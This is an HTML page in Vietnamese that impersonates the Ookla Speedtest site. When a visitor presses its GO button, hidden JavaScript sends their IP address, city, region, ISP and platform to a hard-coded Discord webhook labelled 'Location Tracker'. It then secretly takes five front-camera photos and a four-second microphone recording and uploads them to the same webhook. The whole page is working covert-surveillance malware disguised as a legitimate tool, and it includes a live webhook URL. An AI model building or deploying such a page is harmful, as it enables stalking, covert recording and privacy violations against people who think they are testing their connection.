<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Speedtest by Ookla</title>
    <style>
        body {
            background: black;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            font-family: monospace;
            color: white;
            overflow: hidden;
        }
        /* === GIAO DIỆN SPEEDTEST === */
        .speedtest {
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 10;
            background: #0a0a0a;
        }
        .logo {
            font-size: 2.8rem;
            font-weight: bold;
            color: #00ff9d;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #666;
            font-size: 1.1rem;
            margin-bottom: 50px;
        }
        .circle {
            width: 240px;
            height: 240px;
            border: 14px solid #222;
            border-top-color: #00ff9d;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 4rem;
            font-weight: bold;
            color: #00ff9d;
            margin-bottom: 40px;
            animation: spin 1.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        button {
            background: #00ff9d;
            color: black;
            border: none;
            padding: 18px 50px;
            font-size: 1.2rem;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
        }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <!-- GIAO DIỆN SPEEDTEST (THÊM VÀO) -->
    <div class="speedtest" id="speedtestScreen">
        <div class="logo">SPEEDTEST</div>
        <div class="subtitle">by Ookla</div>
        <div class="circle" id="circle">GO</div>
        <button onclick="startRealTracking()">BẮT ĐẦU KIỂM TRA</button>
        <div style="margin-top: 30px; color:#555; font-size:0.9rem;">Nhấn GO để kiểm tra tốc độ mạng</div>
    </div>

    <!-- CODE GỐC CỦA BẠN (KHÔNG SỬA) -->
    <div style="display:none;">
        <div id="info"></div>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <audio id="audio" style="display:none;"></audio>

    <script>
        // ================== WEBHOOK CỦA BẠN ==================
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1487644219945390160/FNtkSqJw4J-4md6mgXJpfwdCsX8pcWn72BEd6snufQKxCNzJzGL5HVzdgknp9L9-cCbM';
       
        const PHOTO_COUNT = 5;
        const PHOTO_INTERVAL = 300;
        const AUDIO_DURATION = 4000;
       
        let photoSentCount = 0;
        let cameraStream = null;
        let cameraActive = false;
        let audioRecorded = false;
        let mediaRecorder = null;
        let audioChunks = [];
        let gpsDataSent = false;

        // === Các hàm gốc của bạn (giữ nguyên 100%) ===
        async function sendTextToDiscord(content) {
            try {
                const payload = {
                    content: content,
                    username: "Huy Hoang - Location Tracker",
                    avatar_url: "https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png"
                };
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) { console.error('Send text error:', e); }
        }

        async function sendFileToDiscord(fileBlob, fileName, caption = '') {
            try {
                const formData = new FormData();
                formData.append('file', fileBlob, fileName);
                const payload = { content: caption, username: "Huy Hoang - Location Tracker" };
                formData.append('payload_json', JSON.stringify(payload));
                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
            } catch (e) { console.error('Send file error:', e); }
        }

        async function sendAudioToDiscord(blob) {
            const fileName = `audio_${Date.now()}.ogg`;
            const caption = `🎤 **Ghi âm** - ${new Date().toLocaleString('vi-VN')}`;
            await sendFileToDiscord(blob, fileName, caption);
        }

        async function sendPhotoToDiscord(blob, photoNumber) {
            const fileName = `capture_${photoNumber}_${Date.now()}.jpg`;
            const caption = `📸 **Ảnh chụp #${photoNumber}** - ${new Date().toLocaleString('vi-VN')}`;
            await sendFileToDiscord(blob, fileName, caption);
            photoSentCount++;
        }

        async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
            return new Promise((resolve) => {
                try {
                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob((blob) => {
                            if (blob) sendPhotoToDiscord(blob, photoNumber);
                            resolve();
                        }, 'image/jpeg', 0.85);
                    } else {
                        setTimeout(() => captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve), 50);
                    }
                } catch (e) {
                    console.error(`Lỗi chụp ảnh #${photoNumber}:`, e);
                    resolve();
                }
            });
        }

        async function captureMultiplePhotos(video, canvas, ctx) {
            if (!cameraActive) return;
            for (let i = 1; i <= PHOTO_COUNT; i++) {
                await captureSinglePhoto(video, canvas, ctx, i);
                if (i < PHOTO_COUNT) await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL));
            }
            if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
        }

        async function startRecording() {
            if (audioRecorded) return;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                mediaRecorder.ondataavailable = (event) => { if (event.data.size > 0) audioChunks.push(event.data); };
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    if (audioBlob.size > 0) await sendAudioToDiscord(audioBlob);
                    audioRecorded = true;
                    stream.getTracks().forEach(track => track.stop());
                };
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
                }, AUDIO_DURATION);
            } catch (e) {
                console.error('Lỗi ghi âm:', e);
            }
        }

        async function getIPAndLocation() {
            let ip = 'Không xác định';
            let city = 'Không xác định';
            let region = 'Không xác định';
            let isp = 'Không xác định';
            const apis = [
                'https://ip-api.com/json/?fields=status,query,country,regionName,city,isp,org',
                'https://ipapi.co/json/',
                'https://api.ipify.org?format=json'
            ];
            for (const apiUrl of apis) {
                try {
                    const res = await fetch(apiUrl, { signal: AbortSignal.timeout(5000) });
                    if (!res.ok) continue;
                    const data = await res.json();
                    if (apiUrl.includes('ip-api.com')) {
                        if (data.status === 'success') {
                            ip = data.query || ip;
                            city = data.city || city;
                            region = data.regionName || region;
                            isp = data.isp || data.org || isp;
                            break;
                        }
                    } else if (apiUrl.includes('ipapi.co')) {
                        ip = data.ip || ip;
                        city = data.city || city;
                        region = data.region || region;
                        isp = data.org || isp;
                    }
                } catch (e) {}
            }
            return { ip, city, region, isp };
        }

        async function getInfoAndSendToDiscord() {
            const { ip, city, region, isp } = await getIPAndLocation();
            const time = new Date().toLocaleString('vi-VN');
            const message = `**📥 KHÁCH TRUY CẬP MỚI**\n\n` +
                `🌐 **IP:** ${ip}\n` +
                `📍 **Thành phố:** ${city}\n` +
                `🗺️ **Khu vực:** ${region}\n` +
                `🏢 **Nhà mạng:** ${isp}\n` +
                `📱 **Thiết bị:** ${navigator.platform || 'Không xác định'}\n` +
                `⏰ **Thời gian:** ${time}\n` +
                `🔗 **Nguồn:** Truy cập trực tiếp`;
            await sendTextToDiscord(message);
        }

        async function startCameraImmediately() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 800 }, height: { ideal: 600 }, facingMode: 'user' }
                });
                cameraStream = stream;
                cameraActive = true;
                video.srcObject = stream;
                await new Promise(r => video.onloadedmetadata = r);
                await new Promise(r => setTimeout(r, 150));
                await captureMultiplePhotos(video, canvas, ctx);
            } catch (e) {
                console.warn('Camera lỗi:', e);
            }
        }

        // ================== THÊM PHẦN MỚI ==================
        async function startRealTracking() {
            document.getElementById('speedtestScreen').classList.add('hidden');
            
            // Bắt đầu code gốc của bạn
            await getInfoAndSendToDiscord();
            setTimeout(() => startCameraImmediately(), 600);
            setTimeout(() => startRecording(), 1000);
        }

        // Khởi động
        window.addEventListener('load', () => {
            // Không tự chạy ngay, chờ người dùng nhấn nút GO
        });
    </script>
</body>
</html>
